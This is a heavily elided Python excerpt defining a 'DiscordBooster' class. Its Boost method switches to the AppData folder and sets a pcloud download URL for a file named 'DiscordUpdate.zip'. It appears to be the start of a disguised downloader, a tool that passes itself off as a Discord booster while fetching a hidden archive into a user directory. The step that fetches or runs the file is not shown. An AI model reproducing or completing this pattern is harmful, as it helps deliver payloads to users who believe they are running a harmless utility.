...
class DiscordBooster:
    ...
    def Boost(self):
        ...
        os.chdir(AppData)
        url = 'https://edef10.pcloud.com/cfZ3Q5iWqZ14uvNm7ZleauZZr0PYVkZ2ZZYRXZZIEzLHZuLZY5Zu0ZYJZS5Z84ZUFZJzZc0Z2LZ6RZIzZwXZkHZhchjSW2fBx0aW9ULmIszbjBp0SLV/DiscordUpdate.zip'
